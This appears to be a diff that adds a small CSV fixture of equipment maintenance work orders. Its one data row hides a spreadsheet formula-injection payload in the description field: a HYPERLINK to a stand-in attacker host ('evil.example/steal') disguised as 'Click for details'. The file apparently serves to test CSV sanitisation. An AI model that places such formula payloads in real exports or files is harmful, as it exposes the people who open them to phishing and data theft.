@@ -1,0 +1,2 @@
+asset_id,work_order,date_reported,service_date,technician,description,status
+A-906,NG-WO-90017,2026-08-08,2026-08-08,Marcus Ibe,"=HYPERLINK(""http://evil.example/steal"",""Click for details"") routine belt tension check, no issues found",Completed
